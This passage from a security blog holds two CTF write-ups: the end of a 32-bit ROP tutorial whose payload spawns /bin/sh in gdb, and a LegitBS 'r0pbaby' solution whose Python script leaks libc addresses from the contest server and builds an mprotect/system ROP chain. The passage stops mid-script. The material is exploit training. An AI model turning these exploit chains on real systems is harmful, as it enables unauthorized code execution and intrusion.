<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">seb</span><span class="nd">@minol</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">python</span> <span class="n">purepoc0</span><span class="o">.</span><span class="n">py</span> <span class="o">&gt;</span> <span class="n">input0</span>
</span><span class='line'><span class="n">seb</span><span class="nd">@minol</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="n">level0</span>
</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">seb</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">level0</span><span class="o">...</span><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="n">input0</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">ROP</span> <span class="n">tutorial</span> <span class="n">level0</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">What</span><span class="s">&#39;s your name? [+] Bet you can&#39;</span><span class="n">t</span> <span class="n">ROP</span> <span class="n">me</span><span class="p">,</span> <span class="n">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK</span><span class="err">�@�</span>
</span><span class='line'>              <span class="err">��</span><span class="o">/</span><span class="nb">bin</span><span class="err">��</span><span class="n">D</span><span class="err">�</span>
</span><span class='line'>                       <span class="err">��</span><span class="o">/</span><span class="n">shX</span><span class="err">��</span><span class="p">{</span>       <span class="err">�</span><span class="n">G</span><span class="err">�</span>
</span><span class='line'>                                         <span class="err">�</span><span class="n">AAAA</span><span class="err">!</span>
</span><span class='line'>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
</span><span class='line'><span class="p">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
</span><span class='line'><span class="n">EAX</span><span class="p">:</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">EBX</span><span class="p">:</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">ECX</span><span class="p">:</span> <span class="mh">0xbffff5cc</span> <span class="o">--&gt;</span> <span class="mh">0x80ca720</span> <span class="o">--&gt;</span> <span class="mh">0xfbad2a84</span>
</span><span class='line'><span class="n">EDX</span><span class="p">:</span> <span class="mh">0x80ca047</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">ESI</span><span class="p">:</span> <span class="mh">0x80488e0</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__libc_csu_fini</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span><span class="p">)</span>
</span><span class='line'><span class="n">EDI</span><span class="p">:</span> <span class="mh">0x6f23fbda</span>
</span><span class='line'><span class="n">EBP</span><span class="p">:</span> <span class="mh">0x4b4b4b4b</span> <span class="p">(</span><span class="s">&#39;KKKK&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">ESP</span><span class="p">:</span> <span class="mh">0xbffff658</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">EIP</span><span class="p">:</span> <span class="mh">0x41414141</span> <span class="p">(</span><span class="s">&#39;AAAA&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">EFLAGS</span><span class="p">:</span> <span class="mh">0x210246</span> <span class="p">(</span><span class="n">carry</span> <span class="n">PARITY</span> <span class="n">adjust</span> <span class="n">ZERO</span> <span class="n">sign</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
</span><span class='line'><span class="n">Invalid</span> <span class="err">$</span><span class="n">PC</span> <span class="n">address</span><span class="p">:</span> <span class="mh">0x41414141</span>
</span><span class='line'><span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
</span><span class='line'><span class="mo">0000</span><span class="o">|</span> <span class="mh">0xbffff658</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">0004</span><span class="o">|</span> <span class="mh">0xbffff65c</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">000</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xbffff660</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">0012</span><span class="o">|</span> <span class="mh">0xbffff664</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">0016</span><span class="o">|</span> <span class="mh">0xbffff668</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">0020</span><span class="o">|</span> <span class="mh">0xbffff66c</span> <span class="o">--&gt;</span> <span class="mh">0x6f23fbda</span>
</span><span class='line'><span class="mo">0024</span><span class="o">|</span> <span class="mh">0xbffff670</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mo">002</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xbffff674</span> <span class="o">--&gt;</span> <span class="mh">0x0</span>
</span><span class='line'><span class="p">[</span><span class="o">------------------------------------------------------------------------------</span><span class="p">]</span>
</span><span class='line'><span class="n">Legend</span><span class="p">:</span> <span class="n">code</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">rodata</span><span class="p">,</span> <span class="n">value</span>
</span><span class='line'><span class="n">Stopped</span> <span class="n">reason</span><span class="p">:</span> <span class="n">SIGSEGV</span>
</span><span class='line'><span class="mh">0x41414141</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x80ca040</span>
</span><span class='line'><span class="mh">0x80ca040</span><span class="p">:</span>  <span class="s">&quot;/bin/sh&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Excellent, that worked. Now we have to set the registers accordingly. <code>ebx</code> must be set to <code>0x80ca040</code>, <code>eax</code> must be set to <code>0x0b</code> and we&rsquo;ll zero out <code>ecx</code> and <code>edx</code>.</p>

<p>There are no gadgets that do <code>xor ecx, ecx; ret</code>. Instead, I opted to load <code>0xffffffff</code> into <code>ecx</code> and <code>edx</code> and then increase the registers by one; this will overflow and make both of them zero.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># building from the previous code</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525ed</span><span class="p">)</span>   <span class="c"># pop ecx; pop ebx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>   <span class="c"># ecx -&gt; will be zeroed later</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca040</span><span class="p">)</span>   <span class="c"># ebx, filename to execute &quot;/bin/sh&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08083f36</span><span class="p">)</span>   <span class="c"># inc ecx; adc al, 0x39; ret</span>
</span><span class='line'>                          <span class="c"># this will clobber eax, but we&#39;ll set it later anyway. ecx will be zero</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># do the same for edx                     </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>   <span class="c"># </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804ef21</span><span class="p">)</span>   <span class="c"># inc edx; add al, 0x83; ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>Our next problem arises: I don&rsquo;t want to use NULL bytes. However, we&rsquo;ll need to set <code>eax</code> to <code>0x0000000b</code>. I use the following sequence for this, making use of the <code>movzx</code> instruction. <code>movzx</code> is <em>move into register, zero extend</em>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># continue</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0806b893</span><span class="p">)</span>   <span class="c"># pop eax; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x4141410b</span><span class="p">)</span>   <span class="c"># value for eax, without NULL bytes</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08071b90</span><span class="p">)</span>   <span class="c"># movzx eax, al; ret</span>
</span><span class='line'>                          <span class="c"># after this instruction, eax will be 0x0b</span>
</span><span class='line'>                          
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08052cf0</span><span class="p">)</span>   <span class="c"># int 0x80; ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s it. Let&rsquo;s try:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>python purepoc0.py &gt; input0
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb -q level0
</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r &lt; input0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...
</span><span class='line'>
</span><span class='line'>process <span class="m">3481</span> is executing new program: /bin/dash
</span><span class='line'><span class="o">[</span>Inferior <span class="m">1</span> <span class="o">(</span>process 3481<span class="o">)</span> exited normally<span class="o">]</span>
</span><span class='line'>Warning: not running or target is remote
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Nice! It looks like the shell was spawned! A final test consists of running it on the command line. The extra <code>cat</code> is added to keep the spawned shell alive, by connecting stdin and stdout of the newly created shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="o">(</span>python purepoc0.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...&lt;snipped&gt;
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>seb<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>seb<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>seb<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,103<span class="o">(</span>fuse<span class="o">)</span>,104<span class="o">(</span>scanner<span class="o">)</span>,107<span class="o">(</span>bluetooth<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,119<span class="o">(</span>kismet<span class="o">)</span>,900<span class="o">(</span>cbnetwork<span class="o">)</span>
</span><span class='line'>whoami
</span><span class='line'>seb
</span></code></pre></td></tr></table></div></figure>


<p>That was about it. The ROP chain is able to set all the required registers, write out a string in memory and finally perform a syscall.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LegitBS CTF - R0pbaby]]></title>
    <link href="http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby/"/>
    <updated>2015-05-29T23:07:23+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been away for quite a while, and I missed most of the LegitBS CTF. There were only a few hours left when I joined Swappage. Here&rsquo;s how we solved r0pbaby.</p>

<!--more-->


<p>So we&rsquo;re given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc&rsquo;s base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain&hellip; couldn&rsquo;t be easier, right?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/ropbaby<span class="nv">$ </span>file r0pbaby
</span><span class='line'>r0pbaby: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, stripped
</span><span class='line'>bas@tritonal:~/tmp/ropbaby<span class="nv">$ </span>gdb ./r0pbaby
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : ENABLED
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : ENABLED
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc <em>version</em>. This took us some time to figure out, but luckily Swappage found an <a href="https://github.com/niklasb/libc-database">offline tool to identify libc</a>. It was <code>libc6_2.19-0ubuntu6.6_i386</code>. Another nice tool to identify libc is <a href="http://libcdb.com">libcdb.com</a>. After identifying the right libc version, we could find all the necessary gadgets via <a href="http://ropshell.com">ropshell.com</a>. Our plan was to <code>mprotect()</code> a certain region of memory as RWX, then <code>read()</code> in some shellcode and return to it.</p>

<p>Now, the plan fell through. For some reason, the <code>read()</code> syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to <code>system()</code>, so I set up a ROP chain to <code>mprotect()</code> the first 0x1000 bytes of libc as RWX. Then, I wrote out the string <code>/bin//sh</code> to memory. At this point, it was getting late and I could have just as easily written out <code>/bin/sh,0</code> to memory&hellip; Finally, returning to <code>system("/bin//sh")</code> spawned a shell, allowing us to read the flag!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">get_function</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;2</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.50</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;(0x0000.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">m</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&#39;localhost&#39;, 4000))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me&#39;</span><span class="p">,</span> <span class="mi">10436</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># get some address where we&#39;ll store the shellcode</span>
</span><span class='line'><span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">get_function</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;system&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">READ</span> <span class="o">=</span> <span class="n">get_function</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;read&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">MPROTECT</span> <span class="o">=</span> <span class="n">get_function</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;mprotect&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this offset was found like so:</span>
</span><span class='line'><span class="c"># $ nm -D ./libc-2.19.so |grep mprotect</span>
</span><span class='line'><span class="c"># 00000000000f4a20 W mprotect</span>
</span><span class='line'><span class="n">LIBC_BASE</span> <span class="o">=</span> <span class="n">MPROTECT</span> <span class="o">-</span> <span class="mh">0xf4a20</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] libc_base  = 0x</span><span class="si">%X</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">LIBC_BASE</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] system()   = 0x</span><span class="si">%X</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">SYSTEM</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] read()     = 0x</span><span class="si">%X</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">READ</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] mprotect() = 0x</span><span class="si">%X</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">MPROTECT</span>
</span><span class='line'>
</span><span class='line'><span class="n">POPRDX</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x000bcee0</span>
</span><span class='line'><span class="n">POPRAX</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x00048858</span>
</span><span class='line'><span class="n">POPRSI</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x00024805</span>
</span><span class='line'><span class="n">POPRDI</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x00022b1a</span>
</span><span class='line'><span class="n">SYSCAL</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x000c1e55</span>
</span><span class='line'><span class="n">MOVMEM</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x0002fa03</span> <span class="c">#: mov [rax], rdx; ret</span>
</span><span class='line'>
</span><span class='line'><span class="c"># kick off ROP chain</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># build ROP chain</span>
</span><span class='line'><span class="c"># first, mprotect() a certain area</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">8</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LIBC_BASE</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCAL</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># secondly, write &#39;/bin&#39; to memory via MOVMEM gadget</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6e69622f</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LIBC_BASE</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">MOVMEM</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># thirdly, write &#39;//sh&#39; to memory</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
